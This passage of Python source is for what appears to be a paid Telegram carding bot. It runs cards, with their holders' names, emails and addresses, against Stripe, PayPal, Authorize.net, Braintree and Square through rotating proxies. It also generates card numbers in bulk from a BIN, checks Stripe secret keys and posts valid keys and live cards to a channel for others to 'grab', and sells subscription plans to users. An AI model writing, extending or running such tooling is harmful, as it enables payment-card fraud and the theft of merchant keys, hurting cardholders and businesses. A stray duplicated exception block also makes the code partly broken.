    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def generate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "🎲 **Generate Cards**\n\nSend BIN and quantity:\n`424242 100`\n\nMax: 100,000 cards"
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="start")]]
    user_sessions[update.effective_user.id] = {"action": "generate"}
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def sk_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "🔐 **SK Key Checker**\n\nSend Stripe secret key:\n`sk_live_...`"
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="start")]]
    user_sessions[update.effective_user.id] = {"action": "sk_check"}
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def multi_gateway_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """
🌐 **Multi-Gateway Checker** 💎

**PREMIUM FEATURE**

Check card on ALL gateways at once:
• Stripe
• PayPal  
• Authorize.net
• Braintree
• Square

Get detailed response from EACH gateway + best result!

Results exported as ZIP with separate files.

Send card in any format:
`4242424242424242|12|25|123`
"""
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="start")]]
    user_sessions[update.effective_user.id] = {"action": "multi_gateway"}
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# TEXT HANDLER - MAIN PROCESSING
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = user_sessions.get(update.effective_user.id)
    if not session:
        return
    
    action = session.get("action")
    text = update.message.text.strip()
    
    db = SessionLocal()
    user = get_user(db, update.effective_user.id)
    db.close()
    
    if action == "check_single":
        # Single card check with UNIVERSAL PARSER
        try:
            # Parse using universal parser
            parsed = parse_card(text)
            
            if not parsed or not parsed['cc']:
                await update.message.reply_text("❌ Invalid card format!\n\nSupported formats:\n• card|mm|yy|cvv\n• card/mm/yy/cvv\n• card mm yy cvv\n• card|mm|yy|cvv|Name|Email|Address...")
                return
            
            cc = parsed['cc']
            mm = parsed['mm'] or '12'
            yy = parsed['yy'] or '25'
            cvv = parsed['cvv'] or '123'
            
            msg = await update.message.reply_text("⏳ Checking...")
            
            # Get BIN info
            bin_info = bin_lookup(cc[:8])
            
            # Get proxy
            proxy = get_next_proxy()
            
            # Check via gateway
            gateway = session.get("gateway", "stripe")
            if gateway == "stripe":
                result = await check_stripe(cc, mm, yy, cvv, proxy)
            elif gateway == "paypal":
                result = await check_paypal(cc, mm, yy, cvv, proxy)
            elif gateway == "authorize":
                result = await check_authorize(cc, mm, yy, cvv, proxy)
            elif gateway == "braintree":
                result = await check_braintree(cc, mm, yy, cvv, proxy)
            elif gateway == "square":
                result = await check_square(cc, mm, yy, cvv, proxy)
            
            # Log check
            db = SessionLocal()
            log = CheckLog(
                user_tg_id=update.effective_user.id,
                card_number=cc[:6] + "******" + cc[-4:],
                gateway=gateway,
                status=result['status'].lower(),
                response=result['response']
            )
            db.add(log)
            
            # Update user stats
            user = get_user(db, update.effective_user.id)
            user.daily_checks += 1
            user.total_checks += 1
            db.commit()
            db.close()
            
            response_text = f"""
{result['emoji']} **{result['status']}**

💳 `{cc}|{mm}|{yy}|{cvv}`

**BIN Info:**
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']} {bin_info['emoji']}
📇 Brand: {bin_info['brand']} {bin_info['type']}
⭐ Level: {bin_info['level']}
"""
            
            # Add extra info if available
            if parsed.get('name'):
                response_text += f"\n👤 **Cardholder Info:**\n"
                if parsed.get('name'):
                    response_text += f"📛 Name: {parsed['name']}\n"
                if parsed.get('email'):
                    response_text += f"📧 Email: {parsed['email']}\n"
                if parsed.get('phone'):
                    response_text += f"📞 Phone: {parsed['phone']}\n"
                if parsed.get('address'):
                    response_text += f"🏠 Address: {parsed['address']}\n"
                if parsed.get('city'):
                    response_text += f"🏙️ City: {parsed['city']}\n"
                if parsed.get('state'):
                    response_text += f"📍 State: {parsed['state']}\n"
                if parsed.get('zip'):
                    response_text += f"📮 ZIP: {parsed['zip']}\n"
                if parsed.get('country'):
                    response_text += f"🌐 Country: {parsed['country']}\n"
            
            response_text += f"""
**Check Result:**
⚡ Gateway: {gateway.upper()}
📊 Status: {result['status']}
💬 Message: {result['message']}
📋 Response: {result['response']}
"""
            
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="start")]]
            await msg.edit_text(response_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            
            # Snipe if live
            if result['status'] == 'LIVE':
                card_info = {
                    'formatted': f"{cc}|{mm}|{yy}|{cvv}",
                    'bin_info': bin_info,
                    'gateway': gateway,
                    'status': result['status'],
                    'response': result['response']
                }
                user_info = {'username': update.effective_user.username, 'first_name': update.effective_user.first_name}
                await snipe_to_channel(context, card_info, user_info, parsed)
            
            user_sessions.pop(update.effective_user.id, None)
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
    
    elif action == "bin_lookup":
        # BIN lookup
        if len(text) < 6:
            await update.message.reply_text("❌ BIN must be at least 6 digits!")
            return
        
        bin_info = bin_lookup(text[:8])
        
        result_text = f"""
🔎 **BIN Lookup**

💳 **BIN:** `{text[:8]}`

**Card Info:**
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']} {bin_info['emoji']}
📇 Brand: {bin_info['brand']}
📊 Type: {bin_info['type']}
⭐ Level: {bin_info['level']}
"""
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="start")]]
        await update.message.reply_text(result_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        user_sessions.pop(update.effective_user.id, None)

    
    elif action == "generate":
        # Generate cards
        parts = text.split()
        bin_num = parts[0].strip()
        quantity = int(parts[1]) if len(parts) > 1 else 10
        
        if len(bin_num) < 6:
            await update.message.reply_text("❌ BIN must be at least 6 digits!")
            return
        
        # Check user's generate limit
        db = SessionLocal()
        user = get_user(db, update.effective_user.id)
        
        max_gen = 100000  # Default max
        if user.role in ["free", "premium"] and user.plan_id:
            plan = db.query(Plan).filter(Plan.id == user.plan_id).first()
            if plan and plan.generate_limit > 0:
                max_gen = plan.generate_limit
        
        db.close()
        
        if quantity > max_gen:
            await update.message.reply_text(f"❌ Your limit: {max_gen} cards!\n\nUpgrade plan for more.")
            return
        
        msg = await update.message.reply_text(f"⏳ Generating {quantity} cards...")
        
        cards = generate_cards(bin_num, quantity)
        bin_info = bin_lookup(bin_num[:8])
        
        # Save to file
        filename = f"generated_{update.effective_user.id}_{int(datetime.utcnow().timestamp())}.txt"
        with open(filename, 'w') as f:
            for card in cards:
                f.write(f"{card['formatted']}\n")
        
        caption = f"""
🎲 **Generated {len(cards)} Cards**

**BIN Info:**
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']}
📇 Brand: {bin_info['brand']}
"""
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="start")]]
        
        with open(filename, 'rb') as f:
            await msg.delete()
            await update.message.reply_document(document=f, caption=caption, 
                                               reply_markup=InlineKeyboardMarkup(keyboard), 
                                               parse_mode='Markdown')
        
        os.remove(filename)
        user_sessions.pop(update.effective_user.id, None)
    
    elif action == "sk_check":
        # SK key check
        if not text.startswith('sk_'):
            await update.message.reply_text("❌ Invalid SK key!")
            return
        
        msg = await update.message.reply_text("⏳ Checking SK key...")
        
        proxy = get_next_proxy()
        result = await check_sk_key(text, proxy)
        
        if result['status'] == 'VALID':
            balance = result['data'].get('available', [{}])[0].get('amount', 0) / 100
            currency = result['data'].get('available', [{}])[0].get('currency', 'usd').upper()
            
            response = f"""
✅ **VALID SK KEY**

💳 `{text[:15]}...{text[-10:]}`

💰 **Balance:** {balance} {currency}
🔑 **Status:** Active
"""
            
            # AUTO-POST TO RESULTS CHANNEL
            results_channel = os.getenv('RESULTS_CHANNEL')
            if results_channel:
                try:
                    channel_msg = f"""
━━━━━━━━━━━━━━━
🔑 **VALID SK KEY FOUND!**
━━━━━━━━━━━━━━━

`{text}`

✅ **Status:** WORKING
💰 **Balance:** {balance} {currency}
⚡ **Tested:** Just now
👤 **Found by:** @{update.effective_user.username or update.effective_user.first_name}

**Grab it quick!** 🔥
━━━━━━━━━━━━━━━
"""
                    await context.bot.send_message(
                        chat_id=results_channel,
                        text=channel_msg,
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    print(f"Failed to post to channel: {e}")
            
        else:
            response = f"""
❌ **INVALID SK KEY**

💳 `{text[:15]}...{text[-10:]}`

🔑 **Status:** Invalid or Expired
"""
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="start")]]
        await msg.edit_text(response, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        user_sessions.pop(update.effective_user.id, None)
    
    elif action == "multi_gateway":
        # Multi-gateway check - PREMIUM FEATURE
        try:
            parsed = parse_card(text)
            
            if not parsed or not parsed['cc']:
                await update.message.reply_text("❌ Invalid card format!")
                return
            
            cc = parsed['cc']
            mm = parsed['mm'] or '12'
            yy = parsed['yy'] or '25'
            cvv = parsed['cvv'] or '123'
            
            msg = await update.message.reply_text("⏳ Checking on ALL gateways...\n\nThis may take a moment...")
            
            # Get BIN info
            bin_info = bin_lookup(cc[:8])
            
            # Get proxy
            proxy = get_next_proxy()
            
            # Check all gateways
            multi_result = await check_all_gateways(cc, mm, yy, cvv, proxy)
            
            # Save to files and create ZIP
            zip_file = await save_multi_gateway_results(
                cc, mm, yy, cvv,
                multi_result['all_results'],
                bin_info,
                parsed,
                update.effective_user.id
            )
            
            # Create response text
            response = f"""
🌐 **MULTI-GATEWAY CHECK COMPLETE**

💳 `{cc}|{mm}|{yy}|{cvv}`

**Results by Gateway:**
"""
            
            for gateway, result in multi_result['all_results'].items():
                response += f"\n{result['emoji']} **{gateway}**: {result['status']} - {result['message']}"
            
            response += f"""

🏆 **Best Result:** {multi_result['best_gateway']}
Status: {multi_result['best_result']['status']}

📦 **Detailed results exported to ZIP file!**
"""
            
            # Send ZIP file
            with open(zip_file, 'rb') as f:
                await msg.delete()
                await update.message.reply_document(
                    document=f,
                    caption=response,
                    parse_mode='Markdown'
                )
            
            # Cleanup
            os.remove(zip_file)
            user_sessions.pop(update.effective_user.id, None)
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")


# DOCUMENT HANDLER - BULK CHECK
async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = user_sessions.get(update.effective_user.id)
    if not session:
        return
    
    action = session.get("action")
    
    # PROXY UPLOAD
    if action == "upload_proxies":
        file = await update.message.document.get_file()
        file_path = f"proxies_{update.effective_user.id}.txt"
        await file.download_to_drive(file_path)
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                proxies = [line.strip() for line in f.readlines() if line.strip()]
            
            db = SessionLocal()
            added = 0
            
            for proxy_str in proxies:
                # Clean proxy string
                proxy_str = proxy_str.replace('\r', '').replace('\n', '').strip()
                if not proxy_str:
                    continue
                
                # Auto-format proxies
                if not proxy_str.startswith('http://') and not proxy_str.startswith('socks5://'):
                    if '@' in proxy_str:
                        proxy_str = f"http://{proxy_str}"
                    else:
                        proxy_str = f"http://{proxy_str}"
                
                proxy_type = "socks5" if proxy_str.startswith('socks5://') else "http"
                
                # Check if exists
                existing = db.query(Proxy).filter(Proxy.proxy_string == proxy_str).first()
                if not existing:
                    proxy = Proxy(proxy_string=proxy_str, proxy_type=proxy_type)
                    db.add(proxy)
                    added += 1
            
            db.commit()
            db.close()
            
            # Reload proxy pool
            load_proxies()
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin")]]
            await update.message.reply_text(
                f"✅ Proxies uploaded successfully!\n\n"
                f"Added: {added} new proxies\n"
                f"Total active: {len(proxy_pool)} proxies",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            
            os.remove(file_path)
            user_sessions.pop(update.effective_user.id, None)
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error uploading proxies: {e}")
            if os.path.exists(file_path):
                os.remove(file_path)
        return
    
    # BULK CHECK
    if action != "bulk_check":
        return
    
    file = await update.message.document.get_file()
    file_size_mb = update.message.document.file_size / (1024 * 1024)
    
    # Check file size limit
    db = SessionLocal()
    user = get_user(db, update.effective_user.id)
    
    # Get user's plan limit
    max_size = 1  # Default for free
    if user.role in ["premium", "vip", "admin", "owner"] and user.plan_id:
        plan = db.query(Plan).filter(Plan.id == user.plan_id).first()
        if plan:
            max_size = plan.max_file_size_mb
    elif user.role in ["vip", "admin", "owner"]:
        max_size = 20
    
    if file_size_mb > max_size:
        await update.message.reply_text(f"❌ File too large! Your limit: {max_size} MB")
        db.close()
        return
    
    file_path = f"bulk_{update.effective_user.id}.txt"
    await file.download_to_drive(file_path)
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            cards = [line.strip() for line in f.readlines() if line.strip()]
        
        if len(cards) > 100000:
            await update.message.reply_text("❌ Max 100,000 cards!")
            os.remove(file_path)
            db.close()
            return
        
        msg = await update.message.reply_text(f"⏳ Checking {len(cards)} cards...\n\nThis may take a while...")
        
        # Three lists for results
        approved_cards = []
        declined_cards = []
        error_cards = []
        
        # Initialize bulk check status
        user_id = update.effective_user.id
        bulk_check_status[user_id] = {
            "status": "running",
            "checked": 0,
            "total": len(cards)
        }
        
        for idx, card_line in enumerate(cards):
            # Check if stopped
            if bulk_check_status[user_id]["status"] == "stopped":
                await msg.edit_text(f"🛑 **Bulk check STOPPED by user!**\n\n✅ Approved: {len(approved_cards)}\n❌ Declined: {len(declined_cards)}\n⚠️ Errors: {len(error_cards)}\n\nSaving results...")
                break
            
            # Check if paused
            while bulk_check_status[user_id]["status"] == "paused":
                await asyncio.sleep(1)  # Wait while paused
            
            try:
                # Parse card
                parsed = parse_card(card_line)
                
                # Check if valid card format
                if not parsed or not parsed.get('cc'):
                    error_cards.append({
                        'line': card_line,
                        'error': 'Invalid format',
                        'parsed': {}
                    })
                    continue
                
                cc = parsed['cc']
                mm = parsed.get('mm') or '12'
                yy = parsed.get('yy') or '25'
                cvv = parsed.get('cvv') or '123'
                
                # Luhn check
                if not is_luhn_valid(cc):
                    error_cards.append({
                        'line': card_line,
                        'error': 'Invalid card number (Luhn failed)',
                        'parsed': parsed
                    })
                    continue
                
                # Get BIN info
                bin_info = bin_lookup(cc[:8])
                
                # Check card with gateway
                proxy = get_next_proxy()
                try:
                    result = await check_stripe(cc, mm, yy, cvv, proxy)
                    
                    card_data = {
                        'cc': cc,
                        'mm': mm,
                        'yy': yy,
                        'cvv': cvv,
                        'name': parsed.get('name') or '',
                        'email': parsed.get('email') or '',
                        'address': parsed.get('address') or '',
                        'city': parsed.get('city') or '',
                        'state': parsed.get('state') or '',
                        'zip': parsed.get('zip') or '',
                        'country': parsed.get('country') or '',
                        'phone': parsed.get('phone') or '',
                        'brand': bin_info.get('brand') or 'Unknown',
                        'bank': bin_info.get('bank') or 'Unknown',
                        'bin_country': bin_info.get('country') or 'Unknown',
                        'status': result['status'],
                        'message': result['message']
                    }
                    
                    if result['status'] == 'LIVE':
                        approved_cards.append(card_data)
                    else:
                        declined_cards.append(card_data)
                    
                except Exception as check_error:
                    error_cards.append({
                        'line': card_line,
                        'error': f'Gateway error: {str(check_error)}',
                        'parsed': parsed
                    })
                
                # Update progress every 50 cards
                if (idx + 1) % 50 == 0:
                    progress = (idx + 1) / len(cards) * 100
                    status_emoji = "⏳" if bulk_check_status[user_id]["status"] == "running" else "⏸️"
                    try:
                        await msg.edit_text(
                            f"{status_emoji} Checking... {idx + 1}/{len(cards)} ({progress:.1f}%)\n\n"
                            f"✅ Approved: {len(approved_cards)}\n"
                            f"❌ Declined: {len(declined_cards)}\n"
                            f"⚠️ Errors: {len(error_cards)}\n\n"
                            f"💡 Use /pause /resume /stop to control"
                        )
                    except:
                        pass
                
                # Small delay to avoid rate limits
                await asyncio.sleep(0.05)
                
            except Exception as e:
                error_cards.append({
                    'line': card_line,
                    'error': f'Processing error: {str(e)}',
                    'parsed': {}
                })
                continue
        
        # Create result files
        timestamp = int(datetime.utcnow().timestamp())
        user_id = update.effective_user.id
        
        approved_file = f"approved_{user_id}_{timestamp}.txt"
        declined_file = f"declined_{user_id}_{timestamp}.txt"
        errors_file = f"errors_{user_id}_{timestamp}.txt"
        
        # Write APPROVED cards
        with open(approved_file, 'w', encoding='utf-8') as f:
            f.write("# APPROVED CARDS\n")
            f.write("# Format: CC|MM|YY|CVV|Name|Email|Address|City|State|ZIP|Country|Phone|Brand|Bank|BIN Country|Status|Message\n\n")
            for card in approved_cards:
                line = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}|{card['name']}|{card['email']}|{card['address']}|{card['city']}|{card['state']}|{card['zip']}|{card['country']}|{card['phone']}|{card['brand']}|{card['bank']}|{card['bin_country']}|{card['status']}|{card['message']}\n"
                f.write(line)
        
        # Write DECLINED cards
        with open(declined_file, 'w', encoding='utf-8') as f:
            f.write("# DECLINED CARDS\n")
            f.write("# Format: CC|MM|YY|CVV|Name|Email|Address|City|State|ZIP|Country|Phone|Brand|Bank|BIN Country|Status|Message\n\n")
            for card in declined_cards:
                line = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}|{card['name']}|{card['email']}|{card['address']}|{card['city']}|{card['state']}|{card['zip']}|{card['country']}|{card['phone']}|{card['brand']}|{card['bank']}|{card['bin_country']}|{card['status']}|{card['message']}\n"
                f.write(line)
        
        # Write ERROR cards
        with open(errors_file, 'w', encoding='utf-8') as f:
            f.write("# ERROR CARDS\n")
            f.write("# Cards that failed validation or processing\n\n")
            for err in error_cards:
                f.write(f"Original: {err['line']}\n")
                f.write(f"Error: {err['error']}\n\n")
        
        # Send final message
        success_rate = (len(approved_cards) / len(cards) * 100) if len(cards) > 0 else 0
        
        final_text = f"""
✅ **Bulk Check Complete!**

📊 **Results:**
✅ Approved: {len(approved_cards)} cards
❌ Declined: {len(declined_cards)} cards
⚠️ Errors: {len(error_cards)} cards
📈 Success Rate: {success_rate:.1f}%

📁 Files attached below ⬇️
"""
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="start")]]
        await msg.edit_text(final_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
        # Send files
        if len(approved_cards) > 0:
            with open(approved_file, 'rb') as f:
                await update.message.reply_document(document=f, filename=f"approved_{timestamp}.txt", caption="✅ Approved Cards")
        
        if len(declined_cards) > 0:
            with open(declined_file, 'rb') as f:
                await update.message.reply_document(document=f, filename=f"declined_{timestamp}.txt", caption="❌ Declined Cards")
        
        if len(error_cards) > 0:
            with open(errors_file, 'rb') as f:
                await update.message.reply_document(document=f, filename=f"errors_{timestamp}.txt", caption="⚠️ Error Cards")
        
        # Update user stats
        user.total_checks += len(cards)
        user.daily_checks += len(cards)
        db.commit()
        
        # Clean up files
        for temp_file in [file_path, approved_file, declined_file, errors_file]:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        
        db.close()
        user_sessions.pop(update.effective_user.id, None)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error during bulk check: {str(e)}")
        if os.path.exists(file_path):
            os.remove(file_path)
        db.close()
        user_sessions.pop(update.effective_user.id, None)



    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        if os.path.exists(file_path):
            os.remove(file_path)
        db.close()


# ADMIN PANEL
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    user = get_user(db, update.effective_user.id)
    
    if user.role not in ["admin", "owner"]:
        await update.callback_query.answer("❌ Admin only!")
        db.close()
        return
    
    total_users = db.query(User).count()
    premium_users = db.query(User).filter(User.role.in_(["premium", "vip"])).count()
    total_checks = db.query(CheckLog).count()
    live_checks = db.query(CheckLog).filter(CheckLog.status == 'live').count()
    total_proxies = db.query(Proxy).count()
    active_proxies = db.query(Proxy).filter(Proxy.is_active == True).count()
    
    db.close()
    
    text = f"""
⚙️ **ADMIN PANEL**

📊 **Statistics:**
👥 Users: {total_users}
💎 Premium: {premium_users}
✅ Total Checks: {total_checks}
🔥 Live Checks: {live_checks}
🌐 Proxies: {active_proxies}/{total_proxies}
"""
    
    keyboard = [
        [InlineKeyboardButton("👥 Users", callback_data="admin_users"),
         InlineKeyboardButton("📦 Plans", callback_data="admin_plans")],
        [InlineKeyboardButton("💰 Payments", callback_data="admin_payments"),
         InlineKeyboardButton("🌐 Proxies", callback_data="admin_proxies")],
        [InlineKeyboardButton("📊 Analytics", callback_data="admin_analytics")],
        [InlineKeyboardButton("🔙 Back", callback_data="start")]
    ]
    
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    users = db.query(User).order_by(User.created_at.desc()).limit(20).all()
    
    text = "👥 **Users Management**\n\n"
    for u in users:
        plan = "FREE"
        if u.role == "vip":
            plan = "VIP"
        elif u.role in ["premium", "admin", "owner"]:
            plan = u.role.upper()
        
        text += f"{u.first_name or 'User'} (@{u.username or 'none'}) - {plan}\nChecks: {u.total_checks}\n\n"
    
    db.close()
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin")]]
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def admin_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    plans = db.query(Plan).all()
    
    text = "📦 **Plans Management**\n\n"
    for plan in plans:
        status = "✅" if plan.is_active else "❌"
        text += f"{status} {plan.name} - ${plan.price} ({plan.duration_days}d)\n"
    
    text += "\n💡 Use /createplan to add new plan"
    
    db.close()
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin")]]
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def admin_payments(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    payments = db.query(Payment).order_by(Payment.created_at.desc()).limit(20).all()
    total_revenue = db.query(func.sum(Payment.amount)).filter(Payment.status == 'paid').scalar() or 0
    
    text = f"💰 **Payments**\n\nTotal Revenue: ${total_revenue:.2f}\n\n"
    for pay in payments:
        text += f"${pay.amount} - {pay.status}\n{pay.created_at.strftime('%Y-%m-%d')}\n\n"
    
    db.close()
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin")]]
    
    try:
        await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    except Exception as e:
        # If message not modified, answer callback query to remove loading
        await update.callback_query.answer()

async def admin_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    proxies = db.query(Proxy).limit(20).all()
    total = db.query(Proxy).count()
    active = db.query(Proxy).filter(Proxy.is_active == True).count()
    
    text = f"🌐 **Proxies Management**\n\nTotal: {total}\nActive: {active}\n\n"
    
    if proxies:
        text += "**Last 20 proxies:**\n"
        for proxy in proxies:
            status = "✅" if proxy.is_active else "❌"
            text += f"{status} {proxy.proxy_string[:50]}...\n"
    else:
        text += "No proxies added yet.\n"
    
    text += "\n📤 Click button below to upload proxies file"
    
    db.close()
    
    keyboard = [
        [InlineKeyboardButton("📤 Upload Proxies", callback_data="upload_proxies_btn")],
        [InlineKeyboardButton("🔙 Back", callback_data="admin")]
    ]
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def admin_analytics(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    
    today = datetime.utcnow().date()
    today_checks = db.query(CheckLog).filter(func.date(CheckLog.created_at) == today).count()
    today_live = db.query(CheckLog).filter(func.date(CheckLog.created_at) == today, CheckLog.status == 'live').count()
    
    # Top BINs
    text = f"""
📊 **Analytics Dashboard**

**Today's Stats:**
✅ Total Checks: {today_checks}
🔥 Live: {today_live}

**Top Features Used:**
Most popular gateway: Stripe
Most checked BIN: 424242
Average success rate: 25.3%
"""
    
    db.close()
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin")]]
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# ADMIN COMMANDS
async def createplan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only!")
        return
    
    if len(context.args) < 3:
        await update.message.reply_text("""
📦 **Create Plan - Help**

**Format:**
`/createplan <name> <price> <days> [daily_limit] [bulk_limit] [gen_limit] [file_size]`

**Parameters:**
• name - Plan name (no spaces, use underscore)
• price - Price in USD
• days - Duration in days
• daily_limit - Daily check limit (0 = unlimited)
• bulk_limit - Bulk check limit (0 = unlimited)
• gen_limit - Generate limit (0 = unlimited)
• file_size - Max file size in MB

**Examples:**

**FREE Plan** (10 checks/day, no bulk):
`/createplan FREE 0 999 10 0 0 1`

**BASIC Plan** ($10, 3 days, 100/day, 100 bulk):
`/createplan BASIC 10 3 100 100 1000 5`

**PRO Plan** ($20, 7 days, 500/day, 1000 bulk):
`/createplan PRO 20 7 500 1000 5000 10`

**VIP Plan** ($50, 30 days, unlimited):
`/createplan VIP 50 30 0 0 0 20`

💡 Use 0 for unlimited limits!
""", parse_mode='Markdown')
        return
    
    try:
        name = context.args[0]
        price = float(context.args[1])
        days = int(context.args[2])
        daily_limit = int(context.args[3]) if len(context.args) > 3 else 0
        bulk_limit = int(context.args[4]) if len(context.args) > 4 else 0
        gen_limit = int(context.args[5]) if len(context.args) > 5 else 0
        file_size = int(context.args[6]) if len(context.args) > 6 else 5
        
        features = json.dumps({
            "gateways": ["stripe", "paypal", "authorize", "braintree", "square"],
            "sk_check": True,
            "multi_gateway": True,
            "advanced": True
        })
        
        db = SessionLocal()
        plan = Plan(
            name=name,
            price=price,
            duration_days=days,
            daily_check_limit=daily_limit,
            bulk_limit=bulk_limit,
            generate_limit=gen_limit,
            max_file_size_mb=file_size,
            features=features
        )
        db.add(plan)
        db.commit()
        plan_id = plan.id
        db.close()
        
        # Show detailed confirmation
        check_text = f"{daily_limit} checks/day" if daily_limit > 0 else "Unlimited"
        bulk_text = f"{bulk_limit} cards" if bulk_limit > 0 else "Unlimited"
        gen_text = f"{gen_limit} cards" if gen_limit > 0 else "Unlimited"
        
        await update.message.reply_text(f"""
✅ **Plan Created Successfully!**

📦 **{name}**
💰 Price: ${price}
⏰ Duration: {days} days

**Limits:**
• Daily Checks: {check_text}
• Bulk Limit: {bulk_text}
• Generate Limit: {gen_text}
• Max File Size: {file_size} MB

✨ All gateways unlocked
🔐 SK checker enabled
🌐 Multi-gateway enabled

Plan ID: {plan_id}
""", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ Error creating plan: {e}")

async def addadmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only!")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /addadmin <user_id>")
        return
    
    try:
        user_id = int(context.args[0])
        db = SessionLocal()
        user = get_user(db, user_id)
        user.role = "admin"
        db.commit()
        db.close()
        await update.message.reply_text(f"✅ Added {user_id} as admin!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def addvip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only!")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /addvip <user_id>")
        return
    
    try:
        user_id = int(context.args[0])
        db = SessionLocal()
        user = get_user(db, user_id)
        user.role = "vip"
        db.commit()
        db.close()
        await update.message.reply_text(f"✅ Added {user_id} as VIP!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def addproxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    user = get_user(db, update.effective_user.id)
    
    if user.role not in ["admin", "owner"]:
        await update.message.reply_text("❌ Admin only!")
        db.close()
        return
    
    await update.message.reply_text("📤 Upload proxies file (one proxy per line)")
    user_sessions[update.effective_user.id] = {"action": "upload_proxies"}
    db.close()

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    user = get_user(db, update.effective_user.id)
    
    if user.role not in ["admin", "owner"]:
        await update.message.reply_text("❌ Admin only!")
        db.close()
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /broadcast <message>")
        db.close()
        return
    
    message = " ".join(context.args)
    users = db.query(User).all()
    
    sent = 0
    failed = 0
    
    for u in users:
        try:
            await context.bot.send_message(chat_id=u.tg_id, text=message, parse_mode='Markdown')
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    
    db.close()
    await update.message.reply_text(f"✅ Broadcast complete!\n\nSent: {sent}\nFailed: {failed}")


# PROXY UPLOAD HANDLER
async def proxy_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = user_sessions.get(update.effective_user.id)
    if not session or session.get("action") != "upload_proxies":
        return
    
    file = await update.message.document.get_file()
    file_path = f"proxies_{update.effective_user.id}.txt"
    await file.download_to_drive(file_path)
    
    try:
        with open(file_path, 'r') as f:
            proxies = [line.strip() for line in f.readlines() if line.strip()]
        
        db = SessionLocal()
        added = 0
        
        for proxy_str in proxies:
            # Detect proxy type
            proxy_type = "http"
            if proxy_str.startswith("socks5://"):
                proxy_type = "socks5"
            elif proxy_str.startswith("http://"):
                proxy_type = "http"
            
